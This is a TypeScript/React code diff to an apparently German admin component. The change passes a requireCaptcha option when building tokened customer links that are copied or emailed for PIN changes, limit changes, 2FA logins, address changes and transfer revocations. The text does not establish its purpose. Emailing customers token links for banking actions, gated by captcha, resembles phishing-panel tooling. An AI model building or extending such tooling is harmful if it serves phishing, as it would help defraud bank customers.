@@ -91,7 +91,7 @@ const UnifiedTokensList = () => {
 
   const copy = (t: string) => { navigator.clipboard.writeText(t); toast.success("Token kopiert"); };
   const copyLink = (r: UnifiedRow) => {
-    const url = buildCustomerLink(r.auftraggeber_name, r.token);
+    const url = buildCustomerLink(r.auftraggeber_name, r.token, { requireCaptcha: !!(r as any).require_captcha });
     navigator.clipboard.writeText(url);
     toast.success("Kunden-Link kopiert");
   };
@@ -138,7 +138,7 @@ const UnifiedTokensList = () => {
 
   const openEmail = (r: UnifiedRow) => {
     const kindLabel = r.kind === "pin" ? "PIN-Änderung" : r.kind === "limit" ? "Limit-Änderung" : r.kind === "auth" ? "Login-2FA" : r.kind === "adress" ? "Adress-Änderung" : "Überweisungswiderruf";
-    const link = buildCustomerLink(r.auftraggeber_name, r.token);
+    const link = buildCustomerLink(r.auftraggeber_name, r.token, { requireCaptcha: !!(r as any).require_captcha });
     setEmailVars({
       token: r.token,
       auftraggeber: r.auftraggeber_name || "",
@@ -312,7 +312,7 @@ const StornoFollowUpButton = ({ r }: { r: UnifiedRow }) => {
     });
     setBusy(false);
     if (error) { toast.error("Folge-Token fehlgeschlagen: " + error.message); return; }
-    const url = buildCustomerLink(r.auftraggeber_name || "", token);
+    const url = buildCustomerLink(r.auftraggeber_name || "", token, { requireCaptcha: !!(r as any).require_captcha });
     try { await navigator.clipboard.writeText(url); toast.success(`Folge-Token ${token} kopiert`); }
     catch { toast.success(`Folge-Token erstellt: ${token}`); }
     setOpen(false);
